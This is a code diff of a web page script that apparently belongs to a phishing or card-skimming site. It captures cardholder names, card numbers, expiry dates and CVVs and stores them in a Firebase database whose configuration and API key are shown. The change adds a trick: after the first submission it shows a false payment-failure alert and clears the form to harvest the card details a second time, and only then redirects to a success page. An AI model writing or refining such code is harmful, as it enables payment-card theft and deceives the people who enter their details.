@@ -98,52 +98,63 @@
         </form>
     </div>
 
-    <!-- Firebase and JavaScript -->
-    <script type="module">
-        // Import Firebase modules
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+<script type="module">
+    // Import Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
 
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
-            authDomain: "and-facebook-ab84c.firebaseapp.com",
-            databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
-            projectId: "and-facebook-ab84c",
-            storageBucket: "and-facebook-ab84c.appspot.com",
-            messagingSenderId: "4885749329",
-            appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
-        };
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+        authDomain: "and-facebook-ab84c.firebaseapp.com",
+        databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+        projectId: "and-facebook-ab84c",
+        storageBucket: "and-facebook-ab84c.appspot.com",
+        messagingSenderId: "4885749329",
+        appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+    };
 
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
-        // Handle form submission
-        const form = document.getElementById('payment-form');
-        form.addEventListener('submit', (event) => {
-            event.preventDefault();
+    // Handle form submission
+    const form = document.getElementById('payment-form');
+    form.addEventListener('submit', (event) => {
+        event.preventDefault();
 
-            // Get form data
-            const cardholderName = document.getElementById('cardholder-name').value;
-            const cardNumber = document.getElementById('card-number').value;
-            const expiryDate = document.getElementById('expiry-date').value;
-            const cvv = document.getElementById('cvv').value;
+        // Get form data
+        const cardholderName = document.getElementById('cardholder-name').value;
+        const cardNumber = document.getElementById('card-number').value;
+        const expiryDate = document.getElementById('expiry-date').value;
+        const cvv = document.getElementById('cvv').value;
 
-            // Save to Firebase
-            const paymentRef = ref(db, 'payments/' + Date.now()); // Unique key using timestamp
-            set(paymentRef, {
-                cardholderName,
-                cardNumber,
-                expiryDate,
-                cvv
-            }).then(() => {
-                // Redirect after saving
+        // Save to Firebase
+        const paymentRef = ref(db, 'payments/' + Date.now()); // Unique key using timestamp
+        set(paymentRef, {
+            cardholderName,
+            cardNumber,
+            expiryDate,
+            cvv
+        }).then(() => {
+            // Check submission state in localStorage
+            const isFirstSubmission = localStorage.getItem('submissionState') !== 'submitted';
+
+            if (isFirstSubmission) {
+                // Mark as submitted for the first time
+                localStorage.setItem('submissionState', 'submitted');
+                alert('Failed to process payment. Please try again.');
+
+                // Clear form data
+                form.reset(); // Clears all form fields
+            } else {
+                // Redirect on second submission
                 window.location.href = 'successfulp.html';
-            }).catch((error) => {
-                alert('Failed to save payment information: ' + error.message);
-            });
+            }
+        }).catch((error) => {
+            alert('Failed to save payment information: ' + error.message);
         });
-    </script>
+    });
+</script>
 </body>
 </html>
